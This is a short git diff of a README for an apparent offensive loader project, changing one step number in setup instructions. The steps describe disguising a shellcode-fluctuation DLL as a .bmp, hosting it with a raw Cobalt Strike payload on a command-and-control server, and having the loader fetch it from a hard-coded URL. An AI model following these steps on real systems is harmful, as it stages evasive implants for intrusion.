@@ -35,7 +35,7 @@ ETW Memory Scanner => https://github.com/DamonMohammadbagher/ETWProcessMon2/tree
       Step2: rename "callstackspoofer.dll or ShellcodeFluctuation.dll" to NativeCode_SleepMask.bmp
       Step3: upload bmp file to kali linux [cobaltstrike host]      
       Step4: line 38 of program.cs file in NativePayload_DIM project is "http://192.168.56.104:8000/NativeCode_SleepMask.bmp" , you should change this ip address to cobaltstrike host ip address THEN compile NativePayload_DIM C# code.
-      Step4: make raw payload.bin in cobaltstrike v4.0 host and both files in step3 and step5 should be in same folder & share them via webserver [you can use "Python2.7 -m SimpleHTTPServer" in kali linux]
+      Step5: make raw payload.bin in cobaltstrike v4.0 host and both files in step3 and step5 should be in same folder & share them via webserver [you can use "Python2.7 -m SimpleHTTPServer" in kali linux]
       Step6: Run NativePayload_DIM.exe 
 
 ### NativePayload_DIM + loading Native Dll "ShellcodeFluctuation.dll" into local process
